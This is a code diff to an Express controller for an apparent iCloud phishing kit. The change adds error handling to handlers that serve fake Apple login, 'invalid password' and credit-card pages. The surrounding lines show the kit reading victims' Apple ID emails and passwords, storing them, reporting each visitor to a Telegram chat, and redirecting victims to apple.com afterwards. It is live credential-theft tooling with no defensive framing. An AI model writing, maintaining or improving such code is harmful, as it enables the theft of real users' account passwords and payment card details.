@@ -7,6 +7,9 @@ const chatID = -4076400458
 i = -1
 
 exports.login_page = async (req, res) => {
+  try{
+
+  
   i++
   var ua = req.headers['user-agent'];
 
@@ -21,9 +24,13 @@ exports.login_page = async (req, res) => {
   bot.sendMessage(chatID, "New User Has Landed and is assigned an ID of " + i + "\nUser-Agent : " + ua + "\n")
 
   res.render('icloud', { count : i})
+}catch(err){
+  console.log(err)
+}
 }
 
 exports.login_post = async (req, res) => {
+  try{
   const email = req.body.appleid;
   const password = req.body.password
   const count = req.body.count;
@@ -34,11 +41,14 @@ exports.login_post = async (req, res) => {
 
   res.render('icloud-invalid', { count, email})
 
-
+}catch(err){
+  console.log(err)
+}
   
 }
 
 exports.billingform_post = async (req, res) => {
+  try{
   const email = req.body.appleid;
   const password = req.body.password
   const count = req.body.count;
@@ -47,11 +57,14 @@ exports.billingform_post = async (req, res) => {
 
 
   res.render('icloud-cc', { count, email})
-
+}catch(err){
+  console.log(err)
+}
 }
 
 
 exports.billingformsubmit_post = async (req, res) => {
+  try{
   console.log(req.body)
   const count = req.body.count;
 
@@ -89,19 +102,27 @@ exports.billingformsubmit_post = async (req, res) => {
     default:
       break;
   }
+}catch(err){
+  console.log(err)
+}
 }
 
 
 exports.page_loader_get = async (req, res) => {
+  try{
   console.log(`Recieved req at ${req.url}`)
   page2load = req.params.page
   count = req.params.count 
   theuser = await User.findOne({count})
   email = theuser.appleID
   res.render(`${page2load}-pass`, { count, email })
+}catch(err){
+  console.log(err)
+}
 }
 
 exports.page_loader_post = async (req, res) => {
+  try{
   page2load = req.params.page
   count = req.params.count
   password = req.body.password
@@ -113,10 +134,14 @@ exports.page_loader_post = async (req, res) => {
 
   // res.send('DONE')
   // res.render(page2load, { count })
+}catch(err){
+  console.log(err)
+}
 }
 
 
 exports.invalidpage_loader_post = async (req, res) => {
+  try{
   page2load = req.params.page
   count = req.params.count
   password = req.body.password
@@ -146,6 +171,9 @@ exports.invalidpage_loader_post = async (req, res) => {
   res.redirect('https://apple.com')
 
   // res.render(page2load, { count })
+}catch(err){
+  console.log(err)
+}
 }
 
 exports.test_page = (req, res) => {
